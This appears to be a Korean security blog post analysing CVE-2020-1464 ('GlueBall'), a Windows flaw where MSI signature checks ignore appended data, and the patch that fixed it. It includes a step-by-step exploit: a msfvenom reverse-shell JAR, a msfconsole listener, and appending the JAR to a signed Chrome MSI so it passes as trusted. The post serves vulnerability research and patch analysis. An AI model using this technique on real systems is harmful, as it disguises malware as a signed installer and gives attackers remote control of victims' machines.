---
title: "[연구] CVE-2020-1464 - GlueBall"
author: L0ch
tags:
  [
    L0ch,
    CVE-2020-1464,
    Windows,
    one-day,
    Vulnerability,
    GlueBall,
    research,
    MSI,
  ]
categories: [Research]
date: 2020-10-01 18:00:00
cc: false
index_img: /2020/10/01/l0ch/cve-2020-1464/image3.jpeg
---

# [연구] CVE-2020-1464 - GlueBall

안녕하세요!

오늘은 얼마전 하루한줄에 올라온 GlueBall 취약점 분석을 들고 왔답니다

분석도 쉽고 익스도 간단한 걸 골랐습니다! 왜냐 귀찮으니까요!! (이놈의 게으름 어쩔 ㅋㅋㅋㅋㅋㅋ..)

[대충 하루한줄 링크]

```markdown
요약글을 먼저 보면 이해하기 편해요!
```

사실 이번 취약점이 발견된 때는 2018년 9월로, 마이크로소프트가 이번 20년 8월 정기 패치 때 2년이 지나서야 패치가 되어 재조명되었어요. 왜 이제야 패치를 한 건지는 조금 의아한 부분이 있죠..?

뒷이야기는 일단 제쳐두도록 하고, 본격적으로 어떤 취약점인지 분석과 익스플로잇까지 해보도록 하겠습니다 ~

### MSI(Microsoft Installer)

MSI는 Windows 설치 패키지로, Windows용으로 개발된 타사 프로그램의 설치 및 업데이트 프로그램을 배포하는데 사용됩니다.

여러 개발사들이 윈도우용 프로그램을 배포할 때 MSI 로 배포합니다. 오늘의 희생양이 될 구글의 크롬도 MSI 설치 패키지를 배포하고 있죠

![](cve-2020-1464/image1.png)

### Code Signing Certificate

윈도우용 실행 파일(exe, msi, dll...) 을 실행할 때, 사용자들은 실행하려는 파일이 정상적인 파일인지, 해커에 의해 변조된 파일인지 확인하기가 어렵습니다. 원본파일과 해시값 비교를 하면 되지만, 대부분의 사람들은 그렇게 하기 어렵죠.

그래서 MS는 Code Signing Certificate(코드 서명 인증서) 를 도입했습니다.

이 인증서는 파일을 배포할 때 "이건 안전한 파일임 내가 보증함!" 이라고 증명 해주는 역할을 합니다. 인증서가 없거나, 파일 변조로 인해 인증서가 유효하지 않게 되면 브라우저에서 파일을 다운받거나 윈도우에서 실행할 때 위험한 파일일 수도 있다는 경고를 띄워 사용자들에게 알립니다.

![](cve-2020-1464/image2.png)

```jsx
크롬 설치프로그램 MSI 파일의 인증서
유효한 인증서가 있으면 윈도우에서는 파일을 신뢰하게 됩니다.
```

MS의 SmartScreen filter는 인증서들에 대한 자체적인 white list DB를 관리하며 해당 인증서가 안전한지 아닌지 판단합니다.

인증서는 발급 절차가 까다롭고 받았다고 하더라도 일정 횟수 이상, 일정 기간 이상, 일정 사용자들에게 다운로드 되어야 하고 악성 행위 신고가 없어야 신뢰받는 인증서로 white list에 등록이 됩니다.

이러한 점 때문에 해커들이 악성 파일을 제작하고, 신뢰를 주기 위해 인증서를 등록한다 하더라도 white list에 포함되기는 불가능하겠죠..?

하지만 유효한 인증서가 존재하는 파일을 변조해 악성 파일을 포함시키면 어떻게 될까요? 인증서를 확인했을 때 "오 얘는 인증서가 있네, 너 통과. 내가 보증함" 하면 포함된 악성파일은 거기에 무임승차를 할 수 있는거죠!

![](cve-2020-1464/image3.jpeg)

```jsx
무임승차 가보자~ 가보자~
```

"어? 파일이 변조되면 인증서가 유효하지 않잖아요!"

네 맞습니다. 원래대로라면 파일을 변조하면 인증서는 유효하지 않게 되죠. 하지만 이 부분이 이번 취약점의 핵심입니다.

### GlueBall : CVE-2020-1464

해당 취약점은 MSI 파일의 디지털 인증서를 확인하는 과정에서 발생합니다.

MSI 파일을 실행하면 `msisip.dll` 의 `MsiSIPVerifyIndirectData()` 함수에서 파일의 시작 부분이 유효한 MSI 파일인지 검증하고 서명을 확인하는데요 이 때 파일의 사이즈를 검증하지 않습니다.

![](cve-2020-1464/image4.png)

따라서 MSI 파일의 뒤에 어떠한 데이터를 추가해 변조할 수 있습니다.

취약점은 엄청 간단하죠? 그렇다면 이를 이용해 어떻게 익스플로잇으로 연결하는지 알아볼게요!

### JAR(Java Archive)

자바 플랫폼 배포를 위한 패키지 파일 포맷입니다. 자바 개발 경험이 있으시거나 자바 기반 프로그램을 사용해본 적이 있는 익숙하실 거에요.

jar 은 zip 포맷으로 빌드되어 자바 런타임에서 로드할 때 파일의 끝부분에서부터 로드합니다. 그러니까 파일의 시작 부분에 임의의 데이터를 추가해도 자바 런타임에서는 정상적으로 jar을 실행할 수 있습니다.

이제 슬슬 감이 오시는 분도 계실거에요. 정리하자면

**MSI 파일 끝에 임의 데이터가 와도 유효한 인증서가 되는 취약점 + 파일 앞에 임의의 데이터가 있어도 정상 실행되는 jar**

**⇒ 신뢰받는(?) 악성파일**

이를 그림으로 표현하면

![Overview-JAR-appended-to-MSI](cve-2020-1464/image5.png)

```jsx
출처 : https://www.securityinbits.com/malware-analysis/interesting-tactic-by-ratty-adwind-distribution-of-jar-appended-to-signed-msi/
```

이렇게 인증서로 인증된 ~~_혼종_~~ 악성파일을 생성할 수 있습니다!

![](cve-2020-1464/image6.png)

```jsx
이런느낌..? 민초단 여러분 죄송합니다.(그래도 저건 아니잖아요..)
```

이제는 리버스쉘을 실행하는 jar 파일을 생성해서 인증서가 있는 msi 파일로 둔갑시켜 보도록 하겠습니다.

먼저 구글에서 배포하는 크롬 설치 msi 파일을 다운로드합니다. 구글에서 "크롬 msi" 검색하시면 바로 받을 수 있고 인증서 확인은 우클릭→속성에서 "디지털 서명" 탭을 확인하면 아까 보셨던 사진처럼 확인이 가능해요.

이제 msfvenom으로 리버스쉘 페이로드가 포함된 jar파일을 생성합니다.

![](cve-2020-1464/image7.png)

```markdown
msfvenom -p java/meterpreter/revserse_https LHOST=[HOST IP] -f jar -o [filename].jar
```

그리고 msfconsole에서 리버스쉘 리스너를 실행합니다.

![](cve-2020-1464/image8.png)

```markdown
handler -p java/meterpreter/reverse_https -H 0.0.0.0
```

이제 RCE를 위한 준비는 끝!

생성된 jar 파일과 크롬 설치 msi 파일을 같은 폴더에 두고 합쳐버립니다. 이 때 꼭 msi파일 뒤에 jar 파일이 오도록 순서를 지켜야 한다는 점!

![](cve-2020-1464/image9.png)

이제 생성된 exploit.jar 에서 인증서가 유효한지 확인해보면

![](cve-2020-1464/image10.png)

요렇게 유효한 인증서로 나오는 것을 볼 수 있습니다.

실행을 해보면 피해 PC에서는 아무 반응도 없지만, 프로세스에서는 자바가 돌아가고 있고

![](cve-2020-1464/image11.png)

짜잔! 리버스쉘이 정상적으로 동작하는 걸 볼 수 있습니다! 와아~

### Patch diffing

MS는 이에 대한 패치를 내놓았는데요, 어떻게 패치를 했는지 간단하게 Diffing해볼게요

![](cve-2020-1464/image12.png)

회색 노드는 새로 추가된 코드, 노란색 노드는 변경된 노드입니다.

![](cve-2020-1464/image13.png)

회색 노드를 보면 `MsiSIPVerifyIndirectData()` 함수에서 `NeedFileSizeVerification()` 과 `VerifyFileSize()` 를 호출하는 코드가 추가된 것을 보아 MSI 파일의 사이즈를 확인하는 코드를 추가해 취약점 패치를 한 것을 알 수 있습니다.

여기까지 GlueBall 취약점에 대해 알아봤습니다. 참 쉽죠?

마지막 patch diffing에 대해 궁금하시다면 [Windows Patch Diffing Part.1 링크] 글을 읽으시면 좋아요!
